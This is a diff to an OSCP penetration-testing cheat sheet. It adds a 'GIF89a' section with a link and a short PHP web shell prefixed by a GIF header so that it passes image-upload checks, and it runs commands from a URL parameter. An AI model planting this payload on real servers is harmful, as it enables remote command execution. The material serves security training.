@@ -134,6 +134,7 @@ This repository describes cheat sheet and knowledge for OSCP.
 - [Reverse shell](#reverse-shell)
   - [php-reverse-shell](#php-reverse-shell)
   - [Reverse shell cheat sheet](#reverse-shell-cheat-sheet)
+  - [GIF89a](#gif89a)
   - [Metasploit](#metasploit)
 - [Metasploit](#metasploit-1)
   - [meterpreter](#meterpreter)
@@ -793,6 +794,16 @@ https://pentestmonkey.net/tools/web-shells/php-reverse-shell
 
 ## Reverse shell cheat sheet
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+## GIF89a
+https://github.com/Rajchowdhury420/OSCP-CheatSheet/blob/main/Reverse-Shell-via-JPG.md
+```shell
+GIF89a;
+<?
+system($_GET['cmd']);//or you can insert your complete shell code
+?>
+```
+
 
 ## Metasploit
 Refer  [msfvenom](#msfvenom)
